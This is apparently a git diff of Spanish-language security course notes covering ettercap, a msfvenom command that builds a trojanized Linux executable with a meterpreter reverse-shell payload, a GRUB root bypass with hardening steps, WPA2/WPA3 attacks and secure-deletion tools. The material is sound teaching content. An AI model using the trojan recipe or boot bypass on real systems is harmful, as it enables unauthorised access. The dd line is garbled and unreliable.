@@ -1,4 +1,4 @@
-# PRÁCTICA 2 -
+# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL
 
 - ettercap-text-only / ettercap-graphical
 
@@ -64,6 +64,68 @@ ettercap -P remote_browser
 
 3. crear un binario ejecutable troyanizado para que si alguien lo ejecute, lance un shell contra el metasploit. Payload meterpreter
 
-###### msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.50 lport=1234 -f elf -o navigate3.0
+##### msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.50 lport=1234 -f elf -o navigate3.0
 chmod +x navigate3.0
 ejecutable para linux con un reverse tcp de meterpreter
+
+
+wget -r -k http:// comando para descargar un servidor web (info estática)
+
+-l2 descarga dos niveles (index y siguiente nivel de página)
+
+crappling
+
+-H descargaría las páginas de ese server y a su vez las páginas que enlaza de otros servidores
+
+hacerse root en una maquina a traves del grub desprotegido
+
+rw init=/bin/sh
+
+como proteger el grub?
+
+grub-mkpasswd-pbkdf2 -> genera hash
+
+/etc/grub.d/40_custom
+
+set superuser=root
+
+password_pbkdf2 root [pegar hash]
+
+TEMPEST - ejercito se gasta millones en estas herramientas tempest
+
+rebailling y reflow - el primero es resoldar un chip y el reflow es darle calor a la circuiteria
+
+KRACK
+
+krack attack contra wpa2
+
+wpa3 aparece y se estandariza en 2018
+
+ataques dragon blood contra wpa3
+
+wpa3:
+
+algoritmo SAE autenticacion simultanea entre iguales
+
+algoritmo diffie-hellman CE (dragonfly se basa en él)
+
+
+---------------- 
+
+borrado seguro de información
+
+srm - secure remove
+
+shred 
+
+wipe
+
+eraser - borrado seguro para windows
+
+dd if=/dev/unrandom if=/dev/sdb
+
+sfill 
+
+sswap
+
+smem
